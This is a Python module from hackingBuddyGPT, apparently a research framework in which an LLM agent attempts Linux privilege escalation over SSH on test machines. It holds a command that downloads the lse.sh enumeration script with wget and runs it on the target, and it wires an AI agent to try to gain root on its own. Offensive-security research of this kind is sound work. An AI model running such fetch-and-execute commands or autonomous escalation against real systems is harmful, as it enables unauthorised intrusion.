import json
import pathlib
from mako.template import Template

from hackingBuddyGPT.capabilities import SSHRunCommand, SSHTestCredential
from .common import Privesc
from hackingBuddyGPT.utils import SSHConnection
from hackingBuddyGPT.usecases.base import use_case, AutonomousAgentUseCase

template_dir = pathlib.Path(__file__).parent / "templates"
template_lse = Template(filename=str(template_dir / "get_hint_from_lse.txt"))


class LinuxPrivesc(Privesc):
    conn: SSHConnection = None
    system: str = "linux"

    def init(self):
        super().init()
        self.add_capability(SSHRunCommand(conn=self.conn), default=True)
        self.add_capability(SSHTestCredential(conn=self.conn))


@use_case("Linux Privilege Escalation")
class LinuxPrivescUseCase(AutonomousAgentUseCase[LinuxPrivesc]):
    pass


@use_case("Linux Privilege Escalation using hints from a hint file initial guidance")
class LinuxPrivescWithHintFileUseCase(AutonomousAgentUseCase[LinuxPrivesc]):
    hints: str = None

    def init(self):
        super().init()
        self.agent.hint = self.read_hint()

    # simple helper that reads the hints file and returns the hint
    # for the current machine (test-case)
    def read_hint(self):
        try:
            with open(self.hints, "r") as hint_file:
                hints = json.load(hint_file)
                if self.agent.conn.hostname in hints:
                    return hints[self.agent.conn.hostname]
        except FileNotFoundError:
            self._log.console.print("[yellow]Hint file not found")
        except Exception as e:
            self._log.console.print("[yellow]Hint file could not loaded:", str(e))
        return ""


@use_case("Linux Privilege Escalation using lse.sh for initial guidance")
class LinuxPrivescWithLSEUseCase(AutonomousAgentUseCase[LinuxPrivesc]):
    _hints = []
    _turns_per_hint: int = None

    def init(self):
        super().init()
        self._hints = self.read_hint().splitlines()
        self._turns_per_hint = int(self.max_turns / len(self._hints))

    # simple helper that uses lse.sh to get hints from the system
    def read_hint(self):
        self._log.console.print("[green]performing initial enumeration with lse.sh")

        run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"

        result, _ = SSHRunCommand(conn=self.agent.conn, timeout=120)(run_cmd)

        self.console.print("[yellow]got the output: " + result)
        cmd = self.agent.llm.get_response(template_lse, lse_output=result, number=3)
        self.console.print("[yellow]got the cmd: " + cmd.result)

        return cmd.result

    def perform_round(self, turn: int) -> bool:
        if turn % self._turns_per_hint == 1:
            hint_pos = int(turn / self._turns_per_hint)

            if hint_pos < len(self._hints):
                hint = self._hints[hint_pos]
                self._log.console.print("[green]Now using Hint: " + hint)
                self.agent = self.agent.configurable_recreate()
                self.agent.hint = hint
                self.agent._log = self._log

        return self.agent.perform_round(turn)
